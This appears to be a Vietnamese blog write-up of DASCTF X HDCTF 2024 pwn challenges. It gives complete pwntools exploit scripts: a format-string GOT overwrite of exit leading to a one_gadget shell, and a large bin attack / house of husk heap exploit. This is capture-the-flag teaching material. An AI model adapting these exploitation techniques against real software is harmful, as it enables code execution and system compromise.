---
title: DASCTF X HDCTF 2024 Open Competition
date: 2024-06-13 15-54-05
categories: [CTF]
tags: [pwn]
# image: /assets/image/htb.jpg
math: true
---

- Một giải khá hay giúp mình học được nhiều kĩ thuật mới.

## 签个到吧(pwn_3)

- Một dạng short form fmt. Một trick mà mình đọc được là mỗi % trong payload tương ứng với +1 offset. Ví dụ `%c%c%c%c%c%n == %6$n`
- Hướng khai thác của mình sẽ là overwrite `got exit` -> `main`
- Sau đó, mình sử dụng 2 con trỏ stack để ghi `got.exit` và `got.exit+3` lên stack
- Cuối cùng overwrite `exit` thành `system`

```python
#!/usr/bin/python3

from pwn import *

exe = ELF('pwn_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b* 0x401366
        b* 0x401361
        c
        ''')
        input()


if args.REMOTE:
    p = remote('node5.buuoj.cn', 26040)
else:
    p = process(exe.path)
GDB()
p.recvuntil(b'Gift addr: ')
stack = int(b'0x' + p.recvline(keepends=True), 16)
info("stack: " + hex(stack))
pa = b'%c'*12 + f'%{0x404018-12}c%n'.encode() + \
    f'%{0x100000-0x2ddd}c%46$hn'.encode()
# pa = b'%p'*5
sla(b"age: ", pa)
# leak libc
pa = b'%29$p'.ljust(0x100, b'\0')
sa(b"age: ", pa)
libc.address = int(p.recvuntil(b'Easy', drop=True), 16) - 0x24083
info("libc.address: " + hex(libc.address))
# setup
pa = f'%{0x404018+3}c%28$lln'.encode().ljust(0x100, b'\0')
sa(b"age: ", pa)
# overwrite exit -> one_gadget
one = libc.address + 0xe3b01
one1 = one >> 24
one2 = one & 0xffffff
pa = f'%{one2}c%82$n|%{one1-one2-1}c%52$n'.encode().ljust(0x100, b'\0')
sa(b"age: ", pa)
info("one1: " + hex(one1))
info("one1: " + hex(one))


p.interactive()
```

![](/assets/2024-06-13-DASCTF%20X%20HDCTF%202024%20Open%20Competition/2024-06-13-16-09-17.png)

## 最喜欢的一集 (pwn_4)

- Một bài heap sử dụng [large bin attack](https://github.com/shellphish/how2heap/blob/master/glibc_2.31/large_bin_attack.c) -> [house of husk](https://wan.io.vn/posts/House-of-Husk/)
- Tham khảo: https://programmerall.com/article/76072782318/

```python
#!/usr/bin/python3

from pwn import *

exe = ELF('pwn_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
sln = lambda msg, num: sla(msg, str(num).encode())
sn = lambda msg, num: sa(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        # brva 0x1D98
        c
        ''')
        input()


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)
def cr(name,len, context):
    sla(b'choice:', '1')
    sla(b'name:', name)
    sla(b'length of your desciption: ', str(len))
    sla(b'content of your desciption: ', context)
def de(idx):
    sla(b'choice:', '2')
    sla(b'people:', str(idx))
def ed(idx,name, context):
    sla(b'choice:', '3')
    sla(b'people:', str(idx))
    sla(b'name of the people: ', name)
    sla(b'content of the desciption: ', context)
def sh(idx):
    sla(b'choice:', '4')
    sla(b'people: ', str(idx))


GDB()
# leak libc
cr(b'name0', 0x520, b'context0')    # 0
cr(b'wan', 0x500, b'wan')           # 1
de(0)
cr(b'wan', 0x540, b'wan')           # 2
sh(0)
libc.address = u64(p.recv(8)) - 0x1ed010
info("libc.address: " + hex(libc.address))
fun = libc.address + 0x1f1318
arg = libc.address + 0x1ed7b0

# đưa 3 vào large bin
cr(b'wan', 0x520, b'wan')           # 0
# chuẩn bị cho __printf_arginfo_table[0x73]
cr(b'wan', 0x510, p64(0xe3afe+libc.address)*0x73)   # 3
de(3)
cr(b'wan', 0x540, b'wan')           # 4
de(4)
# overwrite chunk_0[3] = __printf_arginfo_table,
# nếu large bin attack thành công, sẽ đưa được địa chỉ chunk_0 vào __printf_arginfo_table
ed(0,b'wan', p64(libc.address+0x1ed010)*3 + p64(arg-0x20))
# đưa 4 vào large bin
cr(b'wan', 0x540, b'wan')
# overwrite __printf_function_table để không NULL
sa(b'choice:', b'255')
p.sendlineafter(b"Maybe Do you like IU?\n",b"y")
p.sendlineafter(b"Give you a reward!\n",p64(fun) + b'w')
# sleep(0.5)

p.sendlineafter("choice:",b"1337")

p.interactive()
```

## PRETTez
- Mình sẽ cố gắng bổ sung sau
